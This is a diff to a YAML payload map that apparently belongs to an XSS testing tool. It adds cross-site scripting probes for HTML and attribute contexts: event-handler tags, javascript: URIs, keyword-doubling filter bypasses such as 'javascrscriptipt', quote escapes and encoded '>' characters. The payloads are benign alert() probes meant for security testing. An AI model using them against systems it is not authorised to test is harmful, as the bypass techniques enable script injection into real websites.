@@ -1,4 +1,5 @@
 ---
+# Payload map for HTML Context
 "svg":
   "onlonloadoad":
     payloads:
@@ -14,6 +15,7 @@
   "onload":
     payloads:
       - "<img onload=alert()>"
+      - "<img/onload=alert()>"
   "onerror":
     payloads:
       - "<img src=x onerror=alert()>"
@@ -21,5 +23,39 @@
   "autofocus":
     payloads:
       - "<input autofocus=\"\" onfocus=alert()>"
+...
 ---
-
+# Payloads for attribute context
+"href":
+  - "javascript:alert()"
+  - "javascrscriptipt:alealertrt()"
+  - "javascrjavascriptipt:alealertrt()"
+  - "alert()"
+"handlers":
+  - "onmouseover"
+  - "onmousewheel"
+  - "onmouseup"
+  - "onmousedown"
+  - "onload"
+  - "onpageshow"
+  - "onscroll"
+"actions":
+  - "alert()"
+  - "confirm()"
+  - "confirm``"
+  - "alealertrt()"
+  - "alert``"
+  - "alealert``"
+"escapeAttr":
+  - "'"
+  - "\'"
+  - "\\\'"
+  - "\""
+  - "\\\""
+  - "\\\\\""
+"escapeTag":
+  - ">"
+  - "\\>"
+  - "%3e"
+  - "%25%33%65"
+---
